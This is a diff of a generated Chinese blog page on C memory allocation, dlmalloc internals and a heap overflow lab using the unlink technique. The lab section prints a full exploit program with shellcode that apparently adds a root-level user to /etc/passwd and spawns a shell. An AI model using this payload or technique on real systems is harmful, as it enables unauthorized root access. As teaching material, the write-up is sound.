@@ -37,7 +37,7 @@
 
   
 
-<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
+</head>
 
 </html>
 
@@ -119,154 +119,120 @@
 <li>C/C++中动态内存语句使用如malloc等</li>
 <li>介绍dlmalloc 内存管理的实现</li>
 <li>利用dlmalloc的数据结构进行堆溢出攻击的原理</li>
-<li>堆溢出攻击实验</li>
+<li>堆溢出攻击实验<a id="more"></a>
+<h2 id="C-C-语言中动态内存语句的使用"><a href="#C-C-语言中动态内存语句的使用" class="headerlink" title="C/C++语言中动态内存语句的使用"></a>C/C++语言中动态内存语句的使用</h2></li>
 </ul>
-<a id="more"></a>
-<h2 id="c-c-语言中动态内存语句的使用">C/C++语言中动态内存语句的使用</h2>
-<h3 id="内存分配">内存分配</h3>
-<ul>
-<li>
-<p>malloc (size_t size);</p>
+<h3 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h3><ul>
+<li><p>malloc (size_t size);</p>
 <ul>
 <li>分配size个字节的内存，并返回指向该内存的指针</li>
 <li><strong>没有初始化所分配的内存</strong></li>
 </ul>
 </li>
-<li>
-<p>realloc (void *p, size_t size);</p>
+<li><p>realloc (void *p, size_t size);</p>
 <ul>
-<li>
-<p>将p指向的内存块大小改为size个字节</p>
-</li>
-<li>
-<p>新内配的内存没有初始化</p>
-</li>
-<li>
-<p>p必须是以前调用malloc(),calloc()或者realloc()返回的结果，或者为空</p>
+<li>将p指向的内存块大小改为size个字节</li>
+<li>新内配的内存没有初始化</li>
+<li><p>p必须是以前调用malloc(),calloc()或者realloc()返回的结果，或者为空</p>
 <ul>
 <li>p = NULL时，等价于malloc(size);</li>
 </ul>
 </li>
 </ul>
 </li>
-<li>
-<p>calloc (size_t nmemb, size_t size);</p>
+</ul>
+<ul>
+<li><p>calloc (size_t nmemb, size_t size);</p>
 <ul>
 <li>为具有nmemb个元素的，元素大小为size的数组分配内存，返回指向分配数组的指针</li>
 <li>新分配的内存初始化为0</li>
 </ul>
 </li>
-<li>
-<p>C++中的new的用法比较多，举个例子把</p>
+<li><p>C++中的new的用法比较多，举个例子把</p>
 </li>
 </ul>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *pi = <span class="keyword">new</span> <span class="keyword">int</span>;  <span class="comment">//没有初始化</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">5</span>); <span class="comment">//初始化为5</span></span><br><span class="line"><span class="keyword">double</span> *pd = <span class="keyword">new</span> <span class="keyword">double</span>(<span class="number">55.9</span>);</span><br><span class="line"><span class="keyword">int</span> * arr1 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>] <span class="comment">//没有初始化</span></span><br><span class="line"><span class="keyword">int</span> * arr2= <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>]&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;; <span class="comment">//前三个元素初始化为1，2，3</span></span><br></pre></td></tr></table></figure>
-<h3 id="内存释放">内存释放</h3>
+<h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><ul>
+<li><p>free (void *p);</p>
 <ul>
-<li>
-<p>free (void *p);</p>
-<ul>
-<li>
-<p>释放p指向的内存空间，**p必须是以前调用****malloc(),calloc()<strong><strong>或者</strong></strong>realloc()**<strong>返回的结果</strong>，或者为NULL</p>
+<li><p>释放p指向的内存空间，<strong>p必须是以前调用**</strong>malloc(),calloc()<strong><strong>或者</strong></strong>realloc()<strong>**返回的结果</strong>，或者为NULL</p>
 <ul>
 <li>p = NULL时，不执行操作</li>
 </ul>
 </li>
-<li>
-<p><strong>对已释放过的内存进行释放会导致危险的结果</strong>。所以一个好的编程习惯是把free后的指针<strong>设为****NULL</strong></p>
+<li><p><strong>对已释放过的内存进行释放会导致危险的结果</strong>。所以一个好的编程习惯是把free后的指针<strong>设为**</strong>NULL**</p>
 </li>
 </ul>
 </li>
-<li>
-<p>delete和delete[]</p>
+<li><p>delete和delete[]</p>
 <ul>
 <li>需要和new配对使用，之前的用new，则delete,之前的new [] ，则用delete[]</li>
 </ul>
 </li>
 </ul>
-<p></p>
-<h2 id="常见的坑">常见的坑</h2>
-<h3 id="初始化问题">初始化问题</h3>
-<ul>
+<h2 id="常见的坑"><a href="#常见的坑" class="headerlink" title="常见的坑"></a>常见的坑</h2><h3 id="初始化问题"><a href="#初始化问题" class="headerlink" title="初始化问题"></a>初始化问题</h3><ul>
 <li>malloc不对分配的内存进行初始化，如果需要初始化，可以用calloc来分配，或者用memset()来初始化</li>
 <li>初始化错误可能导致信息泄露（Information Leak）</li>
 </ul>
-<h3 id="检查返回值错误">检查返回值错误</h3>
-<p>内存分配可能会失败，需要对失败的情况进行处理</p>
+<h3 id="检查返回值错误"><a href="#检查返回值错误" class="headerlink" title="检查返回值错误"></a>检查返回值错误</h3><p>内存分配可能会失败，需要对失败的情况进行处理</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>C++中new可以用try catch:</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> *pi = <span class="keyword">new</span> <span class="keyword">int</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (bad_alloc) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="其它">其它</h3>
-<ul>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul>
 <li>多次释放内存 如double free</li>
 </ul>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *x = (<span class="keyword">int</span> *) <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"><span class="keyword">int</span> *y = (<span class="keyword">int</span> *) <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">free</span>(x);</span><br></pre></td></tr></table></figure>
 <ul>
-<li>
-<p>引用已经释放的内存</p>
+<li><p>引用已经释放的内存</p>
 <ul>
-<li>for (p = head; p != NULL; p = p-&gt;next) free§;</li>
+<li>for (p = head; p != NULL; p = p-&gt;next) free(p);</li>
 <li>正确的应该为：</li>
 </ul>
 </li>
 </ul>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (p = head; p != <span class="literal">NULL</span>; p = q) &#123;</span><br><span class="line">    q = p-&gt;next; </span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>
-<p>内存管理函数需要匹配</p>
+<li><p>内存管理函数需要匹配</p>
 <ul>
-<li>malloc、calloc、realloc &lt;–&gt;free</li>
-<li>new &lt;–&gt; delete</li>
-<li>new[] &lt;–&gt; delete[]</li>
+<li>malloc、calloc、realloc &lt;—&gt;free</li>
+<li>new &lt;—&gt; delete</li>
+<li>new[] &lt;—&gt; delete[]</li>
 </ul>
 </li>
-<li>
-<p>malloc(0)</p>
+<li><p>malloc(0)</p>
 <ul>
 <li>与平台有关，有的返回长度为0的缓冲区(MSVC），有的返回NULL，</li>
 <li>应该避免这种，以及malloc(-1) 是malloc(2^32 - 1);</li>
 </ul>
 </li>
-<li>
-<p>内存泄漏（Memory Leak）</p>
+<li><p>内存泄漏（Memory Leak）</p>
 <ul>
 <li>已分配的没有被释放，最后可用的会使得可用内存越来越小，造成服务器宕机</li>
 </ul>
 </li>
 </ul>
-<p></p>
-<h2 id="dlmalloc-内存管理的实现">dlmalloc 内存管理的实现</h2>
-<p>GNU C类库及大多数Linux版本将Doug Lea的malloc实现（dlmalloc）作为默认内存分配器，下面介绍dlmalloc中的内存管理</p>
-<h3 id="内存块分类">内存块分类</h3>
-<ul>
-<li>
-<p>在dlmalloc中，内存块有2类，已分配块和空闲块。</p>
-</li>
-<li>
-<p>空闲块通过双向链表形式组织起来</p>
-</li>
-<li>
-<p>在2类块中，都用一个PREV_INUSE位来标识<strong>上一个块</strong>是否已被分配</p>
+<h2 id="dlmalloc-内存管理的实现"><a href="#dlmalloc-内存管理的实现" class="headerlink" title="dlmalloc 内存管理的实现"></a>dlmalloc 内存管理的实现</h2><p>GNU C类库及大多数Linux版本将Doug Lea的malloc实现（dlmalloc）作为默认内存分配器，下面介绍dlmalloc中的内存管理</p>
+<h3 id="内存块分类"><a href="#内存块分类" class="headerlink" title="内存块分类"></a>内存块分类</h3><ul>
+<li>在dlmalloc中，内存块有2类，已分配块和空闲块。</li>
+<li>空闲块通过双向链表形式组织起来</li>
+<li><p>在2类块中，都用一个PREV_INUSE位来标识<strong>上一个块</strong>是否已被分配</p>
 <ul>
 <li>1表示有分配，0表示没有分配</li>
 <li>因为malloc一定为偶数，所以拿最后一个位来标记</li>
 </ul>
 </li>
-<li>
-<p>它们的结构可以参考如下图：</p>
+<li><p>它们的结构可以参考如下图：</p>
 <ul>
 <li><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/allocated-chunk-and-free-chunk.png" alt=""></li>
 </ul>
 </li>
-<li>
-<p>空闲的双向链表如下图</p>
+<li><p>空闲的双向链表如下图</p>
 <ul>
 <li><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/free-chunk-double-linklist.png" alt=""></li>
 </ul>
 </li>
 </ul>
-<h3 id="空闲块合并">空闲块合并</h3>
-<p>调用free时，空闲块可能被合并：</p>
+<h3 id="空闲块合并"><a href="#空闲块合并" class="headerlink" title="空闲块合并"></a>空闲块合并</h3><p>调用free时，空闲块可能被合并：</p>
 <ul>
 <li>若该被释放的块上一块位空闲块，该会被空闲链表中解开并与被释放的块合并</li>
 <li>如果所释放的块的下一块为空闲块，也要被解开和合并</li>
@@ -275,38 +241,30 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(P,BK,FD)&#123;\</span><br><span class="line">FD &#x3D; P-&gt;fd;  \</span><br><span class="line">BK &#x3D; P-&gt;bk; \</span><br><span class="line">FD-&gt;bk &#x3D; BK;\</span><br><span class="line">BK-&gt;fd &#x3D; FD;\</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>如下图</p>
 <p><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/free-chunk-merge.png" alt=""></p>
-<h2 id="堆缓冲区溢出攻击">堆缓冲区溢出攻击</h2>
-<ul>
+<h2 id="堆缓冲区溢出攻击"><a href="#堆缓冲区溢出攻击" class="headerlink" title="堆缓冲区溢出攻击"></a>堆缓冲区溢出攻击</h2><ul>
 <li>堆缓冲区溢出攻击比栈缓冲区溢出要难一些。堆溢出攻击常见的是通过<strong>破坏动态内存管理器所使用的数据结构</strong>，使得内存管理器在进行内存块操作时发生异常，最终导致执行攻击者提供的shellcode，如破坏数据结构来欺骗unlink宏。</li>
 <li>如下面的的代码中存在漏洞：</li>
 </ul>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *first, *second, *third;</span><br><span class="line">	first=<span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">	second=<span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">	third=<span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">free</span>(first);</span><br><span class="line">	<span class="built_in">free</span>(second);</span><br><span class="line">	<span class="built_in">free</span>(third);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>
-<p>在第9行free(first);时，如果下一块（程序中的第二块）内存没有被分配，那么free操作将会试图将其与第1块内存块合并。为此，需要检查第3块内存的PREV_INUSE标识。而当前块的下一块内存将其块大小作为偏移量使用</p>
+<li><p>在第9行free(first);时，如果下一块（程序中的第二块）内存没有被分配，那么free操作将会试图将其与第1块内存块合并。为此，需要检查第3块内存的PREV_INUSE标识。而当前块的下一块内存将其块大小作为偏移量使用</p>
 <ul>
-<li>
-<p><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/free-chunk-merge-2.png" alt=""></p>
-</li>
-<li>
-<p>于是攻击者输入668字节长度的以上数据，第1块内存将会堆溢出，使得第2块内存中的块管理数据被覆盖</p>
+<li><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/free-chunk-merge-2.png" alt=""></li>
+<li><p>于是攻击者输入668字节长度的以上数据，第1块内存将会堆溢出，使得第2块内存中的块管理数据被覆盖</p>
 <ul>
-<li>
-<p>被溢出数据后覆盖的 第二个内存块构如下：</p>
+<li><p>被溢出数据后覆盖的 第二个内存块构如下：</p>
 <ul>
 <li><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/heap-overflow-data-location.png" alt=""></li>
 </ul>
 </li>
-<li>
-<p>由于大小为-4，于是系统认为其下一块内存从当前内存块前4个字节开始，就是even int处所对应的4个字节，而由于其为偶数，最低位（PREV_INUSE）为0，因此系统认为第2块内存块为空闲块，因此调用unlink宏进行移除空闲链表，并进行合并。</p>
+<li><p>由于大小为-4，于是系统认为其下一块内存从当前内存块前4个字节开始，就是even int处所对应的4个字节，而由于其为偶数，最低位（PREV_INUSE）为0，因此系统认为第2块内存块为空闲块，因此调用unlink宏进行移除空闲链表，并进行合并。</p>
 </li>
-<li>
-<p>重点来了，此时unlink操作为</p>
+<li><p>重点来了，此时unlink操作为</p>
 <ul>
 <li>FD = FUNCTION_POINTER-12; //这里的12为BK的偏移</li>
 <li>BK = CODE_ADDRESS</li>
-<li>FD-&gt;bk = *(FD + 12) = *(FUNCTION_POINTER) = BK = CODE_ADDRESS</li>
-<li>就是说*(FUNCTION_POINTER) = CODE_ADDRESS <strong>就是 Write Anything to Anywhere!</strong></li>
+<li>FD-&gt;bk = <em>(FD + 12) = </em>(FUNCTION_POINTER) = BK = CODE_ADDRESS</li>
+<li>就是说<em>(FUNCTION_POINTER) = CODE_ADDRESS <em>*就是 Write Anything to Anywhere!</em></em></li>
 <li>这里CODE_ADDRESS为shellcode地址，而FUNCTION_POINTER为要覆盖的函数指针地址! 比如free函数！</li>
 </ul>
 </li>
@@ -315,27 +273,22 @@
 </ul>
 </li>
 </ul>
-<p></p>
-<h2 id="堆溢出攻击实验">堆溢出攻击实验</h2>
-<h3 id="实验环境">实验环境</h3>
-<p>使用的系统为Read Hat Enterprise Linux 4在终端中输入cat /proc/version显示如下内核信息：</p>
+<h2 id="堆溢出攻击实验"><a href="#堆溢出攻击实验" class="headerlink" title="堆溢出攻击实验"></a>堆溢出攻击实验</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>使用的系统为Read Hat Enterprise Linux 4在终端中输入cat /proc/version显示如下内核信息：</p>
 <ul>
-<li>Linux version 2.6.9-5.EL (<a href="mailto:bhcompile@decompose.build.redhat.com">bhcompile@decompose.build.redhat.com</a>) (gcc version 3.4.3 20041212 (Red Hat 3.4.3-9.EL4)) #1 Wed Jan 5 19:22:18 EST 2005</li>
+<li>Linux version 2.6.9-5.EL (bhcompile@decompose.build.redhat.com) (gcc version 3.4.3 20041212 (Red Hat 3.4.3-9.EL4)) #1 Wed Jan 5 19:22:18 EST 2005</li>
 </ul>
 <p>为了完成这个实验首先关闭内存随机化</p>
 <ul>
 <li>sysctl -w kernel.exec-shield-randomize=0</li>
 </ul>
-<h3 id="寻找地址">寻找地址</h3>
-<p>gcc -ggdb -o bugcode.o bugcode.c</p>
+<h3 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h3><p>gcc -ggdb -o bugcode.o bugcode.c</p>
 <p>然后输入objdump -R bugcode.o得到如图：</p>
 <p><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/find-free-address.png" alt=""></p>
 <p>我们将free作为Function_pointer，根据上面的原理</p>
-<p>Fd = Function_pointer -12 =  0X08049644 -12 = 0x08049638  （这里是减去十进制的12）</p>
+<p>Fd = Function_pointer -12 =  0X08049644 -12 = 0x08049638  （这里是减去十进制的12）</p>
 <p>Bk = codeAddress = first address + 8 （+8 的原因是因为first前8个字节在free过程中会被覆盖）</p>
 <p><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/find-shellcode-address.png" alt=""></p>
-<h3 id="代码构建">代码构建</h3>
-<p><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/code-build.png" alt=""></p>
+<h3 id="代码构建"><a href="#代码构建" class="headerlink" title="代码构建"></a>代码构建</h3><p><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/code-build.png" alt=""></p>
 <p>我们构建680的字节：</p>
 <ul>
 <li>前8个字节随意填充</li>
@@ -346,19 +299,16 @@
 <li>Fd 0x08049638</li>
 <li>BK 0x0804a010</li>
 </ul>
-<p></p>
-<h3 id="最终代码">最终代码</h3>
-<p>根据上述的步骤，构建出如下代码:</p>
+<h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><p>根据上述的步骤，构建出如下代码:</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="comment">/* add user ALI with password ALI*/</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;22222222\x31\xc0\x31\xdb\x6a\x0f\x58\x68\x6a\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x6a\x0f\x58\x68\x6a\x64\x6f\x77\x5b\xc1\xeb\x08\x53\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x6a\x05\x58\x68\x41\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\x01\x04\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x89\xc3\x6a\x04\x58\x68\x41\x73\x68\x0a\x59\xc1\xe9\x08\x51\x68\x6e\x2f\x62\x61\x68\x3a\x2f\x62\x69\x68\x72\x6f\x6f\x74\x68\x4c\x49\x3a\x2f\x68\x3a\x30\x3a\x41\x68\x4b\x2e\x3a\x30\x68\x66\x77\x55\x57\x68\x68\x70\x31\x50\x68\x7a\x59\x65\x41\x68\x41\x61\x41\x51\x68\x49\x38\x75\x74\x68\x50\x4d\x59\x68\x68\x54\x42\x74\x7a\x68\x51\x2f\x38\x54\x68\x45\x36\x6d\x67\x68\x76\x50\x2e\x73\x68\x4e\x58\x52\x37\x68\x39\x4b\x55\x48\x68\x72\x2f\x59\x42\x68\x56\x78\x4b\x47\x68\x39\x55\x66\x5a\x68\x46\x56\x6a\x68\x68\x46\x63\x38\x79\x68\x70\x59\x6a\x71\x68\x77\x69\x53\x68\x68\x6e\x54\x67\x54\x68\x58\x4d\x69\x37\x68\x2f\x41\x6e\x24\x68\x70\x55\x6e\x4d\x68\x24\x36\x24\x6a\x68\x41\x4c\x49\x3a\x89\xe1\xba\x41\x41\x41\x7f\xc1\xea\x08\xc1\xea\x08\xc1\xea\x08\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x59\x59\x59\x59\x68\x58\x58\x58\x58\x68\x2f\x73\x68\x42\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xb0\x01\xb3\x01\xcd\x80&quot;</span></span><br><span class="line"><span class="string">&quot;22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222&quot;</span></span><br><span class="line"><span class="string">&quot;\x22\x22\x22\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x38\x96\x04\x08&quot;</span></span><br><span class="line"><span class="string">&quot;\x10\xa0\x04\x08&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	<span class="comment">//(*(void(*)()) shellcode)();	</span></span><br><span class="line">	<span class="keyword">char</span> *first,*second,*third;</span><br><span class="line">	first=<span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">	second=<span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">	third=<span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(first,shellcode,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">	<span class="built_in">free</span>(first);</span><br><span class="line">	<span class="built_in">free</span>(second);</span><br><span class="line">	<span class="built_in">free</span>(third);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>几点说明：</p>
 <ul>
 <li>这里为了方便实验，直接把shellcode设为数组，而不是原来的argv[1]，然后使用的是memcpy函数</li>
 <li>最后那个even int为了方便gdb查看，填充的是\x22\x22\x22\x22</li>
 </ul>
-<h3 id="查看代码效果">查看代码效果</h3>
-<ul>
+<h3 id="查看代码效果"><a href="#查看代码效果" class="headerlink" title="查看代码效果"></a>查看代码效果</h3><ul>
 <li>gcc -ggdb -z execstack -g -o a test.c</li>
-<li>gdb a</li>
+<li>gdb a</li>
 </ul>
 <p>用gdb设置断点，然后查看second附近的内存</p>
 <p>覆盖前</p>
@@ -377,8 +327,7 @@
 <p>运行后</p>
 <p><img src="../images/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/after-heap-overflow-etc-passwd.png" alt=""></p>
 <p>实际上，上面的代码中malloc(668)同样能执行^ ^</p>
-<h2 id="参考资料">参考资料</h2>
-<ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li>RUC 《程序设计安全》 - 梁彬</li>
 </ul>
  
